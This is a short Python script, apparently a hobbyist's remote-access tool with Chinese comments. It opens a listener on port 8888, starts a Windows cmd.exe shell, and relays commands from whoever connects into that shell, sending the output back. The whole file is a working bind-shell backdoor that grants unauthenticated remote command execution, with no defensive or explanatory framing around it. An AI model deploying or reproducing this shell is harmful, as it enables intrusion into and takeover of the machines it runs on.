# !/usr/bin/env python
# -*- coding: utf-8 -*-
# @author Luffy
from socket import *
import subprocess
import os, threading

#创建函数读取subprocess的输出
def func(args, proc):
        while True:
                msg = proc.stdout.readline()
                args.send(msg)

if __name__ == "__main__":
    server=socket(AF_INET,SOCK_STREAM)
    server.bind(('0.0.0.0',8888))
    server.listen(5)
    print('waiting for connect')
    args, addr = server.accept()
    print('connect from',addr)
    proc = subprocess.Popen('cmd.exe /K', stdin=subprocess.PIPE, 
                stdout=subprocess.PIPE, stderr=subprocess.PIPE, shell=True)
    t = threading.Thread(target=func,args=(args,proc))#创建新的线程读取返回，如果不创建新的线程，只能执行一次命令
    t.setDaemon(True)
    t.start()
    while True:
        cmd = args.recv(1024)#获取客户端命令行输入
        proc.stdin.write(cmd)#执行命令
        proc.stdin.flush()#刷新